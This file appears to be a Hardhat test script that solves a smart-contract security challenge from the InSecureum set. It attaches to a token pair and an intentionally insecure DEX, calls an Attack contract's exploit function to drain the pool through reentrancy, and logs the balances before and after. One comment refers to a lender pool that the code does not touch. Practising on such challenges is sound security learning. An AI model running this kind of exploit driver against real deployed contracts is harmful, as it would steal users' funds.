const { expect } = require("chai");

describe("Challenge 1", function () {
  it("Transfer all balance", async function () {
    const [player,deployer] = await ethers.getSigners();
    
    const Token1Contract = await ethers.getContractFactory("InSecureumToken");
    const toa='0x8464135c8F25Da09e49BC8782676a84730C318bC';
    const token1Contract = await Token1Contract.attach(toa);

    const Token2Contract = await ethers.getContractFactory("SimpleERC223Token");
    const toa1='0x71C95911E9a5D330f4D621842EC243EE1343292e';
    const token2Contract = await Token2Contract.attach(toa1);
    
    const DexContract = await ethers.getContractFactory("InsecureDexLP");
    const toa2='0x948B3c65b89DF0B4894ABE91E6D02FE579834F8F';
    const dexContract = await DexContract.attach(toa2);

    const AttackContract = await ethers.getContractFactory("Attack");
    const toa3='0x5FbDB2315678afecb367f032d93F642f64180aa3';
    const attackContract = await AttackContract.attach(toa3);

    //The idea is that anyone can deposit $ISECs to enlarge the pool's resources.
    //Will you be able to steal the $ISECs from the InSecureumLenderPool?
    console.log("Before exploit");
    console.log("Deployer       Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(deployer.address)).toString());
    console.log("Player         Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(player.address)).toString());
    console.log("dexContract    Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(toa2)).toString());
    console.log("AttackContract Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(toa3)).toString());
    console.log("Deployer       Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(deployer.address)).toString());
    console.log("Player         Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(player.address)).toString());
    console.log("dexContract    Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(toa2)).toString());
    console.log("AttackContract Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(toa3)).toString());
    
    //Add pool liquidity and exploit removing with a reentrancy
    const tx4=await attackContract.exploit(token1Contract.address,token2Contract.address,dexContract.address);
    await ethers.provider.waitForTransaction(tx4.hash);

    console.log("\nAfter exploit");
    console.log("Deployer       Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(deployer.address)).toString());
    console.log("Player         Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(player.address)).toString());
    console.log("dexContract    Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(toa2)).toString());
    console.log("AttackContract Token1 balance:", ethers.utils.formatEther(await token1Contract.balanceOf(toa3)).toString());
    console.log("Deployer       Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(deployer.address)).toString());
    console.log("Player         Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(player.address)).toString());
    console.log("dexContract    Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(toa2)).toString());
    console.log("AttackContract Token2 balance:", ethers.utils.formatEther(await token2Contract.balanceOf(toa3)).toString());
    //Tokens drained from dex to AttackerContract(toa3)
  });
});